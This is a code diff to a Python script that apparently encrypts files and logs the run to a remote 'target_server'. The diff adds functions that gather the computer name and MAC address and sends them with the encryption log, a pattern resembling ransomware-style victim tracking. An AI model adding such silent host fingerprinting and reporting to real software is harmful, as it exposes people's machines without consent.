@@ -7,6 +7,10 @@ from datetime import datetime
 
 import json
 import requests
+import platform
+import socket
+import os
+import uuid
 
 def postRequest(url,body):
     try:
@@ -15,6 +19,33 @@ def postRequest(url,body):
     except requests.exceptions.HTTPError as err:
         raise SystemExit(err)
     return r
+
+def getCompName():
+    try:
+        n1 = platform.node()
+    except:
+        n1 = ''
+    try:
+        n2 = socket.gethostname()
+    except:
+        n2 = ''
+    try:
+        n3 = os.environ["COMPUTERNAME"]
+    except:
+        n3 = ''
+    if n1 == n2 == n3:
+        return n1
+    elif n1 == n2:
+        return n1
+    elif n1 == n3:
+        return n1
+    elif n2 == n3:
+        return n2
+    else:
+        raise SystemExit("Computernames are not equal to each other")
+
+def getMacAddress():
+    return ':'.join(("%012X" % uuid.getnode())[i:i+2] for i in range(0, 12, 2))
 ######################################
 
 folder = "key/"
@@ -41,7 +72,7 @@ with open("time.log", "a") as logFile:
 try:
     config = json.load(open('lib/config.json',"rb"))
     url = config['target_server']+'log'
-    body={'type':'encrypt','duration':str(end-start),'size': str(size)}
+    body={'type':'encrypt','duration':str(end-start),'size': str(size),'compName':getCompName(),'macAddr': getMacAddress()}
     result = postRequest(url,body)
     print("Send log success")
 except:
